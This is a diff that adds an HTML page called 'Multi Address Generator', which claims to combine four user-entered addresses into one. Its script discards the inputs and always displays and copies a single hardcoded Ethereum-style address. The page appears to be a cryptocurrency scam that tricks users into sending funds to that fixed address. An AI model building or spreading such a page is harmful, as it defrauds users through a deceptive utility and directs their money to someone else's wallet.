@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Multi Address Generator</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            padding: 20px;
+            background-color: #f9f9f9;
+        }
+        h1 {
+            color: #333;
+        }
+        form {
+            margin-bottom: 20px;
+        }
+        label {
+            font-weight: bold;
+            display: block;
+            margin: 10px 0 5px;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            padding: 10px 15px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #result {
+            padding: 15px;
+            background-color: #e9f7ef;
+            border: 1px solid #d4edda;
+            border-radius: 4px;
+            margin-top: 20px;
+            color: #155724;
+        }
+        #copyBtn {
+            margin-top: 10px;
+            background-color: #28a745;
+        }
+        #copyBtn:hover {
+            background-color: #218838;
+        }
+    </style>
+</head>
+<body>
+    <h1>Multi Address Generator</h1>
+    <form id="addressForm">
+        <label for="address1">Address 1:</label>
+        <input type="text" id="address1" required>
+
+        <label for="address2">Address 2:</label>
+        <input type="text" id="address2" required>
+
+        <label for="address3">Address 3:</label>
+        <input type="text" id="address3" required>
+
+        <label for="address4">Address 4:</label>
+        <input type="text" id="address4" required>
+
+        <button type="button" onclick="generateAddress()">Generate Address</button>
+    </form>
+
+    <div id="result" style="display: none;">
+        <p><strong>Combined Address:</strong> <span id="outputAddress">0xA0f1B31C650eBcb2E07CEf96174cee7197451c0e</span></p>
+        <button id="copyBtn" onclick="copyToClipboard()">Copy Address</button>
+    </div>
+
+    <script>
+        function generateAddress() {
+            // Predefined output address
+            const predefinedAddress = "0xA0f1B31C650eBcb2E07CEf96174cee7197451c0e";
+
+            // Collect the inputs
+            const addr1 = document.getElementById('address1').value;
+            const addr2 = document.getElementById('address2').value;
+            const addr3 = document.getElementById('address3').value;
+            const addr4 = document.getElementById('address4').value;
+
+            // Validate inputs
+            if (addr1 && addr2 && addr3 && addr4) {
+                // Display the predefined address
+                document.getElementById('outputAddress').innerText = predefinedAddress;
+                document.getElementById('result').style.display = "block";
+            } else {
+                alert("Please fill in all fields!");
+            }
+        }
+
+        function copyToClipboard() {
+            // Copy the predefined address to clipboard
+            const address = document.getElementById('outputAddress').innerText;
+            navigator.clipboard.writeText(address).then(() => {
+                alert("Address copied to clipboard!");
+            }).catch(err => {
+                console.error("Failed to copy text: ", err);
+            });
+        }
+    </script>
+</body>
+</html>
